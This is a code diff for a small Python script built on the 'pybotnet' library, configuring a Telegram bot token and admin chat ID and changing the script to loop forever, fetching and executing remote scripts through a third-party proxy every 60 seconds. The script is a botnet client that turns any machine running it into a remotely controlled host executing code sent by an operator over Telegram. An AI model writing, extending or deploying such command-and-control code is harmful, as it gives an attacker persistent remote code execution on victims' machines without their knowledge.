@@ -1,21 +1,17 @@
 from configs import *
 import util
-import pybotnet
 import logging
 
-# show_log = False
 
-# # logging:
-# if show_log:
-#     # show all log's
-#     log_level = logging.INFO
-# else:
-#     # off all log's
-#     log_level = 100
-# my_logger = logging
-# my_logger.basicConfig(level=log_level)
-# logger = my_logger.getLogger('PyBotNet')
+import pybotnet
+import time
 
+TELEGRAM_TOKEN = '1468299500:AAHsvEH-5VyIfWYMzZcYxF_e00000000000'
+ADMIN_CHAT_ID = '12345678910'
+delay = 60
 
 bot = pybotnet.PyBotNet(TELEGRAM_TOKEN, ADMIN_CHAT_ID, show_log=True)
-bot.get_and_execute_scripts_by_third_party_proxy()
+
+while True:
+    bot.get_and_execute_scripts_by_third_party_proxy()
+    time.sleep(delay)
